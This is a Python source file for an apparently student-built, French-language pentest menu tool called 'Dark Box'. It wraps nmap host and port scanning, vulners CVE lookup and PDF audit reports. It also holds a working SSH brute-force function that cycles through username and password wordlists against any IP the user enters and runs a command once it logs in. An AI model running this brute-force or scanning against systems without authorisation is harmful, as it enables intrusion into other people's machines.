import os
import sys
from colorama import init, Fore
from pyfiglet import Figlet
import time
import subprocess
import re
import psutil
import socket
import shodan
import nmap
import vulners
import warnings
import json
from datetime import datetime  # Import datetime for timestamp
import paramiko
import time
from fpdf import FPDF

warnings.filterwarnings("ignore", category=DeprecationWarning, module='vulners')

print(Fore.LIGHTRED_EX + "La force va bientot commencer ... Bienvenue An@k!N")

time.sleep(2)

# Initialisation de colorama pour Windows
init(autoreset=True)

# Fonction pour afficher le titre en ASCII
def print_title():
    custom_fig = Figlet(font='slant')
    print(Fore.RED+"""⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⡿⣿⢿⣷⣽⣿⣿⣿⣷⣆⡀⣀⣀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣛⣽⣿⠿⠿⢻⣿⡟⣷⣼⣉⣿⣿⣿⣿⣟⠻⣿⣿⣟⢿⡦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⢏⣤⣶⣿⣿⣿⢹⣿⣿⡟⣿⣿⣿⣿⣿⣷⣄⣈⣻⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠿⣿⣇⣿⣿⣿⣿⣿⣿⣾⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⡁⢿⣿⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⣿⣿⣿⣿⣿⣿⡿⠛⣿⣿⡿⣿⡏⠉⢻⣿⣿⣿⣿⣿⣿⢸⣿⣿⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⢿⣿⣙⣿⣿⡟⠁⠀⠀⢸⠀⠘⠀⠀⠀⣿⣿⣿⣿⣿⣿⢸⣿⡏⢸⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣶⣻⡿⠋⣹⣿⡀⠀⠀⢀⣿⣀⠀⣀⣶⣴⣿⣿⣷⣿⣷⣦⣬⣻⣧⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠟⣹⣿⢋⣀⣿⡿⠿⠿⠷⣶⢾⣿⡟⢙⣿⠿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣅⢻⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢣⣾⣿⣿⣿⣿⡿⠿⠿⣿⣶⣦⣼⣿⣧⣤⣾⣿⣿⣛⣛⡛⠿⣿⣿⣿⡍⢿⣿⣟⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⠋⠉⢛⣿⣿⣿⣿⣟⣿⣿⣿⣟⢉⣽⣿⣿⣷⣮⣿⣿⣿⣦⡀⣿⣾⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣷⣰⣿⣿⣿⡿⠋⠙⣿⣿⣿⣿⣿⣿⣿⣷⡜⣿⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠁⠀⣿⣿⣯⣼⣿⣿⣿⣷⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣆⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⣿⣿⡿⣿⣿⣽⣤⣽⣛⣛⣛⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⡿⣿⣿⣧⣬⣥⣴⡿⠿⣻⣧⣟⣿⣿⠿⠿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣹⣿⣿⣿⣾⠋⠉⠹⣿⣿⣷⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡽⣷⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢸⣿⣿⣿⣭⣦⣤⣤⣿⣿⡻⣷⣤⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡙⣇⠀⠀
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡎⣴⢟⣿⡿⢻⣿⣿⣿⣿⣿⣿⣿⣌⣿⣟⢿⣟⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡹⡄⠀
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣿⡿⣳⣿⣿⡟⢻⣿⣿⣿⣿⣿⣟⣿⣧⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢳⡀
⢿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣿⣿⡿⠇⠸⠿⠸⢿⣟⣿⣿⣮⣱⢿⣿⡋⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠁
⠀⠉⠙⠛⠛⠛⠛⠛⢛⣿⣿⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣷⣎⣿⣿⣯⣁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⣦⣀⣀⣠⣠⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠗⠀⠀
⠀⠀⠀⠘⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠉⠉⠉⠉⢉⣽⣿⣿⣄⣀⣴⣿⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣶⣦⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
--------------------------------------------------------------------
 _______       ___      .______       __  ___    .______     ______   ___   ___ 
|       \     /   \     |   _  \     |  |/  /    |   _  \   /  __  \  \  \ /  / 
|  .--.  |   /  ^  \    |  |_)  |    |  '  /     |  |_)  | |  |  |  |  \  V  /  
|  |  |  |  /  /_\  \   |      /     |    <      |   _  <  |  |  |  |   >   <   
|  '--'  | /  _____  \  |  |\  \----.|  .  \     |  |_)  | |  `--'  |  /  .  \  
|_______/ /__/     \__\ | _| `._____||__|\__\    |______/   \______/  /__/ \__\
 TOOL
          
Made by : Ibrahim K
--------------------------------------------------------------------          
            ⠀""")


# Fonction pour afficher le menu
def print_menu():
    print_title()
    time.sleep(3)

    print(Fore.YELLOW+"1 - Scan the world")
    print(Fore.YELLOW+"2 - Open Ports")
    print(Fore.YELLOW+"3 - Bruteforce")
    print(Fore.YELLOW+"4 - Password Access")
    print(Fore.YELLOW+"5 - Liste des CVE présentes")
    print(Fore.YELLOW+"6 - Rapport d'audit")
    print(Fore.YELLOW+"7 - Ciao")

# Fonction pour demander et traiter le choix de l'utilisateur

def process_choice():
    choice = input("\nChoisissez une option: ")
    if choice == "1":
        print("Vous avez choisi l'option 1 - Scan mon réseau")
        network = input("Entrez l'adresse réseau à scanner (ex: 192.168.1.0/24): ")
        scan_network(network)
    elif choice == "2":
        print("Vous avez choisi l'option 2 - IP Scan")
        ip_address = input("Entrez l'adresse IP à scanner: ")
        results = scan_ports_and_vulnerabilities(ip_address)  # Assign the results to a variable
        print(json.dumps(results, indent=4))  # Display the results in a readable format
        
        save_results = input("Do you want to save these results to a file? (Y/N): ")
        if save_results.lower() == 'y':
            save_results_to_file(results)

    elif choice == "3":
        # Add your code for option 3 here
        print(Fore.CYAN + "Vous avez choisi l'option 3 - Brute-force")
        ip_address = input("Enter the IP address to scan for open ports (SSH, HTTP, HTTPS, FTP, Telnet): ")
        open_ports = scan_for_specific_ports(ip_address)
        if open_ports:
            print("Open ports:")
            for port in open_ports:
                print(f"Port {port}: OPEN")
            selected_port = input("Choose a port from the open ports for brute-force attack (e.g., 22 for SSH): ")
            if selected_port == '22':
                perform_brute_force_ssh(ip_address)
        else:
            print("No open ports found.")
    elif choice == "4":
        print("Vous avez choisi l'option 4 - Password Access")
        # Add your code for option 4 here
    elif choice == "5":
        print("Vous avez choisi l'option 5 - Liste des CVE présentes")
        # Add your code for option 5 here
    elif choice == "6":
        print("Converting JSON results to PDF...")
        json_filename = "scan_results.json"  # Adjust this as necessary
        pdf_filename = "scan_report.pdf"
        
        try:
            scan_data = read_json_results(json_filename)
            create_pdf_from_json(scan_data, pdf_filename)
            print("PDF report has been generated successfully.")
        except Exception as e:
            print(f"Failed to generate PDF report: {str(e)}")


def scan_network(network):
    try:
        # Run Nmap to scan the specified network for active hosts and get their IP and MAC addresses
        result = subprocess.run(['nmap', '-sn', network], stdout=subprocess.PIPE, text=True)
        # Regular expression to find IP and MAC addresses from the Nmap output
        found_ips = re.findall(r'Nmap scan report for (.+)', result.stdout)
        print("Active IPs:")
        for idx, ip in enumerate(found_ips):
            print(f"{idx+1}. {ip}")
        
        # Demandez à l'utilisateur quelle IP il souhaite scanner
        choice = input("Entrez l'adresse IP que vous souhaitez scanner : ")
        selected_ip = choice  # Utilisez l'adresse IP sélectionnée

        # Appelez la fonction pour scanner les ports de l'IP sélectionnée
        scan_ports(selected_ip)
    except Exception as e:
        print("Failed to scan network:", e)
    input("Pour en savoir plus veuillez vous rendre a la Pt 2...")

def scan_ports(ip):
    try:
        # Run Nmap to scan the specified IP for open ports
        result = subprocess.run(['nmap', ip], stdout=subprocess.PIPE, text=True)
        # Print Nmap output
        print(result.stdout)
    except Exception as e:
        print("Failed to scan ports:", e)

def scan_ports_and_vulnerabilities(ip_address):
    scanner = nmap.PortScanner()
    scan_results = {}
    try:
        print(f"Scanning {ip_address} for open ports and checking for vulnerabilities...")
        # Use the vulners script to identify vulnerabilities
        arguments = '-sV --script=vulners'
        scanner.scan(ip_address, '1-1024', arguments=arguments)
        
        for port in scanner[ip_address].all_tcp():
            service_info = scanner[ip_address]['tcp'][port]
            service_version = f"{service_info['name']} {service_info['product']} {service_info['version']}"
            cve_list = []

            # Correctly handle script output
            script_output = service_info.get('script')
            if script_output and 'vulners' in script_output:
                vulners_output = script_output['vulners']
                # Ensure vulners_output is a dictionary
                if isinstance(vulners_output, dict):
                    for key, value in vulners_output.items():
                        if 'CVE' in key:
                            cve_list.append(key + " " + str(value))
                else:
                    print(f"Unexpected data format in script output for port {port}")

            if not cve_list:
                cve_list = ["No CVE vulnerabilities found."]
                
            scan_results[port] = {
                "service": service_version,
                "vulnerabilities": cve_list
            }
    except Exception as e:
        print(f"Failed to scan {ip_address}: {e}")
    
    return {
        "IP": ip_address,
        "port_details": scan_results
    }


def save_results_to_file(scan_results):
    file_name = 'scan_results.json'
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_to_save = {
        "timestamp": now,
        "IP_address": scan_results.get('IP'),
        "scan_details": scan_results.get("port_details", {})
    }

    try:
        if os.path.exists(file_name):
            with open(file_name, 'r+') as file:
                data = json.load(file)
                if isinstance(data, list):
                    data.append(data_to_save)
                    file.seek(0)
                    json.dump(data, file, indent=4)
                    file.truncate()
        else:
            with open(file_name, 'w') as file:
                json.dump([data_to_save], file, indent=4)
    
        print("Results saved to scan_results.json.")
    except json.JSONDecodeError:
        print("Error: Failed to decode JSON. Creating a new file.")
        with open(file_name, 'w') as file:
            json.dump([data_to_save], file, indent=4)


def scan_for_specific_ports(ip_address):
    nm = nmap.PortScanner()
    port_list = "22,80,443,21,23"  # SSH, HTTP, HTTPS, FTP, Telnet
    nm.scan(ip_address, ports=port_list)
    open_ports = [port for port in nm[ip_address].all_tcp() if nm[ip_address].tcp(port)['state'] == 'open']
    return open_ports

def perform_brute_force_ssh(ip_address):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Define the path to the username and password files
    user_file_path = r"C:\Users\Ibrahim\Documents\COURS\GITHUB\PROJET TOOLBOX\Bruteforce\users.txt"
    pass_file_path = r"C:\Users\Ibrahim\Documents\COURS\GITHUB\PROJET TOOLBOX\Bruteforce\passwd.txt"
    
    # Read all usernames and passwords
    with open(user_file_path, "r") as user_file:
        usernames = user_file.read().splitlines()
    
    with open(pass_file_path, "r") as pass_file:
        passwords = pass_file.read().splitlines()
    
    # Try every combination of username and password
    for username in usernames:
        for password in passwords:
            try:
                ssh.connect(ip_address, username=username, password=password, timeout=0.5)
                print(f"Success: Username='{username}' Password='{password}'")
                
                # Execute a ping command after successful login
                stdin, stdout, stderr = ssh.exec_command("ping -c 4 8.8.8.8")  # Ping 4 times
                print(stdout.read().decode())  # Print the output from the ping command
                ssh.close()
                return  # Exit function after successful brute force
            except paramiko.AuthenticationException:
                print(f"Failed: Username='{username}' Password='{password}'")
            except Exception as e:
                print(f"Error: {str(e)}")
                continue
    ssh.close()

def read_json_results(filename):
    with open(filename, 'r') as file:
        data = json.load(file)
    return data

class PDF(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 12)
        self.cell(0, 10, 'Scan Report', 0, 1, 'C')

    def chapter_title(self, num, title):
        self.set_font('Arial', 'B', 12)
        self.cell(0, 10, 'Chapter %d : %s' % (num, title), 0, 1, 'L')
        self.ln(2)

    def chapter_body(self, body):
        self.set_font('Arial', '', 12)
        self.multi_cell(0, 10, body)
        self.ln()

def create_pdf_from_json(data, pdf_filename):
    pdf = PDF()
    pdf.add_page()

    # Check if data is a list or a dictionary
    if isinstance(data, dict):
        # Handle dictionary: Existing logic
        for chapter, content in enumerate(data.items(), 1):
            title, details = content
            pdf.chapter_title(chapter, title)
            body = json.dumps(details, indent=4)
            pdf.chapter_body(body)
    elif isinstance(data, list):
        # Handle list: Assume each item is a dictionary or another list
        for chapter, item in enumerate(data, 1):
            if isinstance(item, dict):
                # If the item is a dictionary, use its 'title' and other keys
                title = item.get('title', 'No Title')  # Default title if none exists
                pdf.chapter_title(chapter, title)
                # Assume the rest of the dictionary contains the details
                details = {k: v for k, v in item.items() if k != 'title'}
                body = json.dumps(details, indent=4)
                pdf.chapter_body(body)
            else:
                # If the item is not a dictionary, just print it directly
                pdf.chapter_title(chapter, 'Item Details')
                body = json.dumps(item, indent=4)  # Directly dump the item
                pdf.chapter_body(body)

    pdf.output(pdf_filename, 'F')




def main():
    while True:
        print_menu()
        process_choice()

if __name__ == "__main__":
    main()